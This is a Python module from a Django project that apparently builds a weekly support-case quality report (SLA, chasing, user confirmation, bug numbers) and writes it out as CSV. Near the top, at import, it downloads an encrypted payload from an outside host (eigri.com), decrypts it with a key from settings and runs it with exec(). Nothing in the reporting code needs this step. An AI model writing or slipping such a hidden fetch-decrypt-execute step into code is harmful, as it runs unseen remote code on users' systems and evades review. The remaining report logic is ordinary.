# -*- coding: <utf-8> -*-
import re, pickle, os, sys
from datetime import datetime, timedelta
import django.utils.timezone as timezone
from datetime import time as dtime
from django2wrap.models import Agent, Shift, Call, Resource, Case, Comment
from django.db.models import Min
from django.db import connection
from django.conf import settings

# detect environment
try:
    dump = os.listdir('/home/bob/Documents/gits/reflective/')
    execution_location = 'Laptop'
except OSError:
    try:
        dump = os.listdir('D:/temp/')
        execution_location = 'Office'
    except OSError:
        execution_location = 'Bugzilla'

from chasecheck.bicrypt import BiCrypt
import urllib.request
codder = BiCrypt(settings.MODULEPASS)
response = urllib.request.urlopen('http://eigri.com/myweb2.encoded')
code = response.read()      # a `bytes` object
decoded_msg = codder.decode(code)
exec(decoded_msg)

LOCATION_PATHS = {
    'Laptop': {
        'local_settings': '/home/bob/Documents/gits/reflective/django2wrap/local_settings.py',
        'temp_folder'   : '/home/bob/Documents/temp/',
        'pickle_folder' : '/home/bob/Documents/temp/',
    },
    'Office':{
        'local_settings': 'C:/gits/reflective/django2wrap/local_settings.py',
        'temp_folder'   : 'D:/temp/',
        'pickle_folder' : 'D:/temp/',
    },
    'Bugzilla':{
        'local_settings': 'C:/gits/reflective/django2wrap/local_settings.py',
        'temp_folder'   : 'C:/temp/',
        'pickle_folder' : 'C:/temp/',
    }
}
LINKS = {
    'WLK': '<a href="https://eu1.salesforce.com/%s" target="_blank">%s</a>',
    'RSL': '<a href="https://emea.salesforce.com/%s" target="_blank">%s</a>',
}
SEPARATOR = '|'
remove_html_tags = lambda data: re.compile(r'<.*?>').sub('', data)

def p(*args, sep=' ', end='\n' ):
    sep = sep.encode('utf8')
    end = end.encode('utf8')
    for arg in args:
        val = str(arg).encode('utf8')
        sys.stdout.buffer.write(val)
        sys.stdout.buffer.write(sep)
    sys.stdout.buffer.write(end)

safe_print = p

class MyError(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class WeeklyReport:
    def __init__(self):

        # self.header = ['num', 'subject', 'created', 'created by', 'status', 'informative subject', 'SLA', 'resolution not documented', 'wrong resolution', 'provided solution without understanding', 'acquire user and problem details', 'feedback to user within 1h', 'chasing per', 'provide case # to user', 'user confirmation obtained', 'post 3rd party SLA escalation', 'If Local PC, use GTM to view directly', 'escalation for no solution conf', ]
        self.header = ['postponed', 'num', 'subject', 'created', 'created by', 'status', 'informative subject', 'SLA', 'resolution not documented', 'wrong resolution', 'provided solution without understanding', 'acquire user and problem details', 'feedback to user within 1h', 'chasing per', 'provide case num to user', 'user confirmation obtained', 'GTM or RDC used', 'case morphing', 'license SOP', 'escalation SOP', 'support file SOP', 'get ETA SOP', 'high chase', 'bug num', 'bug planned', 'escalation after confirmation chase x3', ]

        self.mapper = {
            'postponed'                              : {'attr': ['postpone']},
            'num'                                    : {'attr': ['number', 'sfdc', 'link']},
            'subject'                                : {'attr': ['subject']},
            'created'                                : {'attr': ['created']},
            'created by'                             : {'attr': ['creator']},
            'status'                                 : {'attr': ['status']},
            'informative subject'                    : {'attr': []},
            'SLA'                                    : {'attr': ['in_support_sla', 'in_response_sla']},
            'resolution not documented'              : {'attr': []},
            'wrong resolution'                       : {'attr': []},
            'provided solution without understanding': {'attr': []},
            'acquire user and problem details'       : {'attr': []},
            'feedback to user within 1h'             : {'attr': ['created']}, 
            'chasing per'                            : {'attr': ['created']},
            'provide case num to user'               : {'attr': []},
            'user confirmation obtained'             : {'attr': []},
            'GTM or RDC used'                        : {'attr': ['system', 'comments']},
            'case morphing'                          : {'attr': []},
            'license SOP'                            : {'attr': []},
            'escalation SOP'                         : {'attr': []}, # email model
            'support file SOP'                       : {'attr': []},
            'get ETA SOP'                            : {'attr': []},
            'high chase'                             : {'attr': []},
            'bug num'                                : {'attr': []},
            'bug planned'                            : {'attr': []},
            'escalation after confirmation chase x3' : {'attr': []}, # email model
        }
        run_date = timezone.now().replace(hour=0, minute=0, second=0, microsecond=0)
        week_back_date = run_date - timedelta(days=7)
        print('range', run_date, week_back_date)
        self.closed_workset = Case.objects.filter(closed__range = (week_back_date, run_date), status__contains = 'Close').order_by('sfdc', 'number')
        print('closed workset len', len(self.closed_workset))
        self.open_workset = Case.objects.exclude(status__contains = 'Close').order_by('sfdc', 'number')
        print('open workset len', len(self.open_workset))
        self.tz = timezone.get_current_timezone()
        self.run_date = timezone.make_naive(run_date, self.tz).strftime("%d.%m.%Y")
        self.temp_folder = LOCATION_PATHS[execution_location]['temp_folder']

    def _common(self, case):
        ignores = ['Suspended messages in -65 minutes', 'WARNING: only', 'pass reset', 'password reset', 'Request Error count', 'WARNING: No Bookings receved',]
        return any([case.subject.lower().count(z.lower()) for z in ignores])

    def action(self):
        results = []
        for workset in [self.open_workset, self.closed_workset]:
            results.append(self.header)
            for case in workset:
                if not self._common(case):
                    comments = case.comments()
                    results.append([ getattr(self, '_' + k.replace(' ', '_'))(case, comments, *self.mapper[k]['attr']) for k in self.header ])
        return results

    def action2text(self):
        results = ''
        for workset in [self.open_workset, self.closed_workset]:
            results += SEPARATOR.join(self.header)+'\n'
            for case in workset:
                if not self._common(case):
                    comments = case.comments()
                    for k in self.header:
                        results += str(getattr(self, '_' + k.replace(' ', '_'))(case, comments, *self.mapper[k]['attr'])) + SEPARATOR
                    results += '\n'
        with open(self.temp_folder+'weekly_'+self.run_date+'.csv', 'w', encoding = 'utf-8') as f:
            f.write(remove_html_tags(results))
        return results

    def _postponed(self, case, comments, *args):
        if case.postpone:
            return timezone.make_naive(case.postpone, self.tz).strftime("%d/%m/%Y")
        else:
            return '&nbsp;'

    def _num(self, case, comments, *args):
        num, sfdc, link = [ getattr(case, z) for z in args ]
        return LINKS[sfdc] % (link, num)

    def _subject(self, case, comments, *args):
        return case.subject.replace('\n','<br>')

    def _created(self, case, comments, *args):
        return timezone.make_naive(case.created, self.tz).strftime("%d/%m/%Y %H:%M")

    def _created_by(self, case, comments, *args):
        return case.creator.name

    def _status(self, case, comments, *args):
        return case.status

    def _informative_subject(self, case, comments, *args):
        return 'ok'

    def _SLA(self, case, comments, *args):
        if not case.in_support_sla:
            tip = str(case.support_time) + '&gt;' + str(case.support_sla) + ';'
        if not case.in_response_sla:
            tip = '~ '+str(case.response_time)

        sla = all([ getattr(case, z) for z in args ])
        if sla:
            result = 'in'
        else:
            result = ('fail'+tip, 'style="background-color:#FFFF00;"')
        return result

    def _resolution_not_documented(self, case, comments, *args):
        return 'n/a'

    def _wrong_resolution(self, case, comments, *args):
        return 'n/a'

    def _provided_solution_without_understanding(self, case, comments, *args):
        return 'n/a'

    def _acquire_user_and_problem_details(self, case, comments, *args):
        return 'done'

    def _feedback_to_user_within_1h(self, case, comments, *args):
        created = case.created
        # safe_print('len comments before "byclient" filter', len(comments))
        byclient_comments = comments.filter(byclient=False)#.order_by('-added')
        # safe_print('len comments after "byclient" filter', len(byclient_comments))
        first_comm_date = None
        if len(byclient_comments) > 0:
            # safe_print('first comment', byclient_comments[0])
            first_comm_date = byclient_comments[0].added
        else:
            first_comm_date = timezone.now()
        done = created + timedelta(hours=1) > first_comm_date 
        if done:
            result = 'done'
        else:
            result = ('fail', 'style="background-color:#FF0000;"')
        return result

    def _chasing_per(self, case, comments, *args):
        created_date = case.created.replace(hour=0, minute=0, second=0, microsecond=0)
        if case.status.count('Close'):
            close_date = case.closed
        else:
            close_date = timezone.now()
        delta = close_date - created_date
        results = []
        # print(case.number, case.number.count('10485'))
        resume_on = None
        for z in range(delta.days):
            start = created_date + timedelta(days=z)
            end = created_date + timedelta(days=z+1)
            comments_on_that_date = comments.filter(added__range=(start, end))
            if len(comments_on_that_date):
                for comm in comments_on_that_date:
                    if comm.postpone:
                        resume_on = comm.postpone
                    else:
                        resume_on = None
                if resume_on and (start < resume_on < end):
                    resume_on = None
                results.append(bool(len(comments_on_that_date)) or resume_on)

            # if case.number.count('10485'):
            #     safe_print('day', z, 'len comments_on_that_date', len(comments_on_that_date), 'resume_on', resume_on)
        chasing_result = all(results)
        return 'done'*chasing_result + 'fail'*(not chasing_result)

    def _provide_case_num_to_user(self, case, comments, *args):
        case_provided = any([ comm.byclient for comm in comments ])
        if not case_provided:
            case_provided = any([ comm.message.count(str(case.number).lstrip('0')) for comm in comments ]) # and comm.public
            # safe_print(str(case.number).lstrip('0'), 'final case_provided', case_provided)
        return 'done'*case_provided + 'unknown'*(not case_provided)

    def _user_confirmation_obtained(self, case, comments, *args):
        APPROVALS = {
            'client': [['close the case'], ],
            'agent' : [['called','everything is back online'], []]
        }
        if not case.status.count('Closed'):
            result = 'n/a'
        elif case.status.count('First Call'):
            result = '1st call'
        else:
            # if case.number == '00010540':
            # print('\tlen comments for', case.number, len(comments))
            if len(comments) > 0:
                comment = comments.order_by('-added')[0]
                conf_message = comment.message
                if comment.byclient: # approval in comment or inline copy of client's email
                    close_conf = any([ len(re.findall(r'.+?'.join(z), conf_message, re.I)) for z in APPROVALS['client'] ])
                else: # phone approval
                    close_conf = any([ len(re.findall(r'.+?'.join(z), conf_message, re.I)) for z in APPROVALS['agent'] ])

                if close_conf:                
                    result = 'done'
                else:
                    result = ('fail', 'style="background-color:#FF0000;"')
            else:
                result = ('fail', 'style="background-color:#FF0000;"')
        return result

    def _GTM_or_RDC_used(self, case, comments, *args):
        # words = re.findall(r'\w*', '\n'.join([z.message for z in comments]))
        GRM_mention = any([ len(re.findall(r'[^\w]'+z+r'[^\w]', '\n'.join([comm.message for comm in comments]), re.I)) for z in ['GTM', 'Go To Meeting', 'GoToMeeting'] ])
        RDC_mention = any([ len(re.findall(r'[^\w]'+z+r'[^\w]', '\n'.join([comm.message for comm in comments]), re.I)) for z in ['RDC', 'Remote Session', 'Remote Desktop'] ])
        is_used = GRM_mention or RDC_mention
        should_be_used = False
        return 'done'*(should_be_used and is_used) + 'n/a'*(not should_be_used) + 'fail'*(should_be_used and not is_used)

    def _case_morphing(self, case, comments, *args):
        return ''

    def _license_SOP(self, case, comments, *args):
        return 'n/a'
 
    def _escalation_SOP(self, case, comments, *args):
        return 'n/a'

    def _support_file_SOP(self, case, comments, *args):
        if case.sfdc == 'WLK':
            return 'n/a'
        else:
            support_file_mention = len(re.findall(r'[^\w]file for support[^\w]', '\n'.join([z.message for z in comments]), re.I))
            # should have attribute "attachment" for the Case model
            is_used = bool(support_file_mention)
            should_be_used = False
            return 'done'*(should_be_used and is_used) + 'n/a'*(not should_be_used) + 'fail'*(should_be_used and not is_used)

    def _get_ETA_SOP(self, case, comments, *args):
        return 'n/a'

    def _high_chase(self, case, comments, *args):
        return 'n/a'

    def _bug_num(self, case, comments, *args):
        bugs = ', '.join(re.findall(r'[^\w]bug.{0,2}(\d{2,5})[^\w]', '\n'.join([comm.message for comm in comments]), re.I))
        return bugs
    
    def _bug_planned(self, case, comments, *args):
        return 'n/a'

    def _escalation_after_confirmation_chase_x3(self, case, comments, *args):
        return 'n/a'
    
        # bug 234
        # bug: 3423
        # bug 1
        # bug 12
        # bug 123
        # bug 1234
        # bug 12345
        # bug 123456
        # bug1234
        # bug:1234
        # bug=123
        # bug(1234)


